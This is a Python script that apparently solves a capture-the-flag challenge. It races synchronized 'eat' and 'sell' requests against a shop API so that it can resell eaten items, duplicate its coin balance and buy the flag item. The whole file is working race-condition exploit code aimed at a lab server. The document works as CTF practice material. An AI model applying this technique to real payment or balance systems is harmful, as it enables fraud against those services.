#!/usr/bin/env python

import requests
from requests_racer import SynchronizedAdapter
import argparse
import time


def get_values():
    r = requests.get(BASE_URL).text
    just_coins = int(r.split('justCoins: ')[1].split('<')[0])
    inv_catfish = int(r.split('name="Catfish" action="eat"')[1].split('Eat (')[1].split(')')[0])

    return just_coins, inv_catfish

def buy_catfish(amount):
    requests.post(BASE_URL + 'api/buy', json={
        'name': 'Catfish',
        'amount': amount
    })

def get_flag(inv_catfish):
    requests.post(BASE_URL + 'api/sell', json={
        'name': 'Catfish',
        'amount': inv_catfish
    })
    requests.post(BASE_URL + 'api/buy', json={
        'name': 'Flagfish',
        'amount': 1
    })
    r = requests.post(BASE_URL + 'api/eat', json={
        'name': 'Flagfish'
    }).json()['response']

    return r

def log(msg, verbose=False):
    if verbose:
        print(str(msg))

parser = argparse.ArgumentParser()
parser.add_argument('host')
parser.add_argument('port', type=int)
parser.add_argument('-v', action="store_true")
args = parser.parse_args()

BASE_URL = f"http://{args.host}:{args.port}/"

while True:
    just_coins, inv_catfish = get_values()
    log(just_coins + inv_catfish, args.v)

    if just_coins + inv_catfish >= 1337:
        log(get_flag(inv_catfish), True)
        break 
    
    if just_coins + inv_catfish == 0:
        log('Ran out of justCoins.. restart server', args.v)
        break

    buy_catfish(just_coins)

    s = requests.Session()
    sync = SynchronizedAdapter()
    s.mount('http://', sync)
    for _ in range(4):
        s.post(BASE_URL + 'api/eat', json={
            'name': 'Catfish'
        })
    s.post(BASE_URL + 'api/sell', json={
        'name': 'Catfish',
        'amount': just_coins+inv_catfish-4
    })
    sync.finish_all()
